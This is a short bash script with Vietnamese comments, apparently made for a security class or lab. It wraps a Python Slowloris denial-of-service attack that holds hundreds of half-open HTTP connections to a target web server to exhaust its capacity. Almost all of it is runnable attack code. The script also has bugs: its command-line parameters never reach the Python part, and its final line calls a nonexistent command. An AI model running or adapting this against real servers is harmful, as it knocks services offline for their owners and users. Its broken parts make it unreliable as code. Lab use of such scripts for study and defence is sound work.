#!/bin/bash
# ============================================
# Script: Slowloris Attack
# Mục đích: Học tập / bài tập ATT
# Giữ nhiều kết nối mở, không gửi request hoàn chỉnh
# ============================================

TARGET_HOST=${1:-"victim-webapi"}
TARGET_PORT=${2:-8080}
NUM_CONNECTIONS=${3:-200}
DURATION=${4:-60}

echo "========================================"
echo " SLOWLORIS ATTACK - MÔ PHỎNG DDoS"
echo "========================================"
echo " Target    : $TARGET_HOST:$TARGET_PORT"
echo " Connections: $NUM_CONNECTIONS"
echo " Duration  : ${DURATION}s"
echo "========================================"
echo ""
echo "[*] Bắt đầu Slowloris..."

python3 << 'PYTHON_SCRIPT'
import socket
import time
import threading
import sys

host = sys.argv[1] if len(sys.argv) > 1 else "victim-webapi"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
num_connections = int(sys.argv[3]) if len(sys.argv) > 3 else 200
duration = int(sys.argv[4]) if len(sys.argv) > 4 else 60

sockets = []
active = 0
failed = 0
start_time = time.time()

print(f"[*] Mở {num_connections} kết nối đến {host}:{port}")

def create_socket():
    global active, failed
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((host, port))
        # Gửi HTTP request không hoàn chỉnh (không có \r\n\r\n cuối)
        s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
        active += 1
        return s
    except Exception:
        failed += 1
        return None

# Tạo socket ban đầu
for i in range(num_connections):
    s = create_socket()
    if s:
        sockets.append(s)
    if i % 50 == 0:
        print(f"  Đã mở {i+1}/{num_connections} kết nối...")

print(f"[+] Active: {active}, Failed: {failed}")
print(f"[*] Duy trì kết nối trong {duration}s...")

# Giữ kết nối sống bằng cách gửi partial headers
end_time = time.time() + duration
cycle = 0
while time.time() < end_time:
    cycle += 1
    elapsed = int(time.time() - start_time)
    print(f"  [{elapsed}s] Cycle {cycle}: {len(sockets)} connections alive")
    
    # Gửi keep-alive header một phần
    dead = []
    for s in sockets:
        try:
            s.send(f"X-Keep-Alive: {cycle}\r\n".encode())
        except:
            dead.append(s)
    
    # Xóa các socket chết
    for s in dead:
        sockets.remove(s)
    
    # Mở lại socket mới nếu bị đóng
    while len(sockets) < num_connections:
        s = create_socket()
        if s:
            sockets.append(s)
    
    time.sleep(10)

print("\n[*] Slowloris hoàn tất!")
for s in sockets:
    try: s.close()
    except: pass
PYTHON_SCRIPT

PYTHON_SCRIPT $TARGET_HOST $TARGET_PORT $NUM_CONNECTIONS $DURATION
